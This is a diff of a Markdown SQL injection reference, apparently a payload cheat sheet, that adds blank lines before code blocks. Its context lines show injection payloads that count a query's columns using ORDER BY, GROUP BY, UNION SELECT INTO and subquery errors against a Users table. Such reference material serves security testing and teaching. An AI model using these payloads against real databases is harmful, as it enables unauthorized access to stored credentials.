@@ -24,6 +24,7 @@ GROUP BY n
 ```
 
 **Example:**
+
 ```sql
 -- Assuming query: SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';
 1' ORDER BY 1--+        -- True
@@ -41,6 +42,7 @@ GROUP BY n
 ```
 
 **Example:**
+
 ```sql
 -- Assuming query with 3 columns
 1' GROUP BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'group statement'"
@@ -55,6 +57,7 @@ GROUP BY n
 ```
 
 **Example:**
+
 ```sql
 -- Assuming query: SELECT permission FROM Users WHERE id = {INJECTION POINT};
 -1 UNION SELECT 1 INTO @,@,@  -- Error: Different number of columns
@@ -70,6 +73,7 @@ AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
 ```
 
 **Example:**
+
 ```sql
 1 AND (SELECT * FROM Users) = 1  -- Error: "Operand should contain 3 column(s)"
 ```
